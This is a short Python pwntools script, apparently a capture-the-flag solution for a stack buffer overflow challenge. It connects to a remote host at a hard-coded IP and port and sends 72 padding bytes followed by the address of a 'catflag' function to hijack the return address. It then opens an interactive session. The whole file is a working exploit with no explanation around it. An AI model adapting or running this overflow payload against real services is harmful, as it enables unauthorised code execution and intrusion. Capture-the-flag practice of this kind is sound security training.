from pwn import *
context.log_level = 'debug'

p="./elf"

context.binary=p
#io=process(p)
io=remote("111.198.29.45",54518)

catflag=0x000000000040060D

payload="a"*72+p64(catflag)
io.sendlineafter(">",payload)

io.interactive()
